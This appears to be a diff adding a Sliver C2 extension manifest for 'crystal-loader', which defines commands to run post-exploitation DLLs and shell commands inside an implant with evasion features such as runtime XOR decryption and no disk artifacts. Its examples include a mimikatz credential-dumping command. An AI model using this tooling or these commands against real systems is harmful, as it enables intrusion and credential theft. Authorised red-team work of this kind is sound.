@@ -1,0 +1,51 @@
+{
+    "name": "crystal-loader",
+    "version": "0.1.0",
+    "extension_author": "crystalkit",
+    "original_author": "rasta-mouse, nickswink, TrustedSec (BOF compat), licitrasimone (CrystalSliver)",
+    "repo_url": "https://github.com/yourname/crystalkit",
+    "commands": [
+        {
+            "command_name": "crystal",
+            "help": "Run a Crystal Palace PICO-wrapped post-ex DLL inside a Sliver implant",
+            "long_help": "Loads and executes a Crystal Palace PICO binary from a path on the target.\n\nArgs format: payload=<path>[|<runtime_args>]\n  Use forward slashes only — Sliver's arg parser eats backslashes.\n\nExamples:\n  crystal payload=C:/tmp/mimikatz.pico.bin\n  crystal payload=C:/tmp/mimikatz.pico.bin|sekurlsa::logonpasswords exit",
+            "entrypoint": "Initialize",
+            "files": [
+                {
+                    "os": "windows",
+                    "arch": "amd64",
+                    "path": "crystal-loader.x64.dll"
+                }
+            ],
+            "arguments": [
+                {
+                    "name": "payload",
+                    "desc": "path[|args]  e.g. C:/tmp/tool.pico.bin|sekurlsa::logonpasswords exit",
+                    "type": "string",
+                    "optional": false
+                }
+            ]
+        },
+        {
+            "command_name": "crystal-exec",
+            "help": "Run a shell command on the target through Crystal Palace evasion",
+            "long_help": "Executes a shell command via an embedded Crystal Palace PICO (no file staging required). The PICO is baked into the extension DLL at build time and XOR-decrypted at runtime. Output is returned to the operator via anonymous pipe — no disk artifact.",
+            "entrypoint": "Initialize",
+            "files": [
+                {
+                    "os": "windows",
+                    "arch": "amd64",
+                    "path": "crystal-exec.x64.dll"
+                }
+            ],
+            "arguments": [
+                {
+                    "name": "cmd",
+                    "desc": "Shell command to execute, e.g. whoami /all",
+                    "type": "string",
+                    "optional": false
+                }
+            ]
+        }
+    ]
+}
